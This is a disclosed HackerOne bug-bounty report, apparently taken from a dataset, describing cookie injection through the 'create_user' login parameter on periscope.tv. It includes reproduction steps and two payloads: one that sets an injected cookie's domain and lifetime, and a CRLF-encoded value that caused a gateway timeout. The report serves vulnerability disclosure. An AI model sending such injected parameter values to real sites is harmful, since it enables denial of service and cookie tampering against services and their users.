---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '583819'
original_report_id: '583819'
title: cookie injection allow dos attack to periscope.tv
weakness: Uncontrolled Resource Consumption
team_handle: x
created_at: '2019-05-18T05:35:10.484Z'
disclosed_at: '2019-07-03T16:59:19.172Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 24
asset_identifier: '*.periscope.tv'
asset_type: WILDCARD
max_severity: none
tags:
- hackerone
- uncontrolled-resource-consumption
---

# cookie injection allow dos attack to periscope.tv

## Metadata

- HackerOne Report ID: 583819
- Weakness: Uncontrolled Resource Consumption
- Program: x
- Disclosed At: 2019-07-03T16:59:19.172Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Description:** i find in  periscope.tv  a parameter "create_user" allow to inject "loginissignup" cookie,
when tested with crlf payload get response "**HTTP/1.1 504 GATEWAY_TIMEOUT**"
** Link Vulnerable:** https://www.periscope.tv/i/twitter/login?create_user=*payload*&csrf=*your_csrf_token*
## Steps To Reproduce:
  1. go to https://www.periscope.tv/
  2. click to login 
  3. click create new account
  4. choose twitter [ google & facebook also vulnerable]

  5-get link like https://www.periscope.tv/i/twitter/login?create_user=true&csrf=*your_csrf_token*

  6-edit create_user parameter 

**example : edit domain & max-age of loginissignup cookie **
payload="exploit;Domain=hakou.com;Max-Age=1000000000000000000000"
link=https://www.periscope.tv/i/twitter/login?create_user=exploit;Domain=hakou.com;Max-Age=1000000000000000000000&csrf=*your_csrf_token*
poc F492114

**example2: dos attack **
payload="dosattack%0d%0ahakou"
link=https://www.periscope.tv/i/twitter/login?create_user=dosattack%0d%0ahakou&csrf=*your_csrf_token*
get this response 
>HTTP/1.1 504 GATEWAY_TIMEOUT
Content-Length: 0
Connection: Close

poc 
F492115

## Impact

inject cookie & dos attack

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
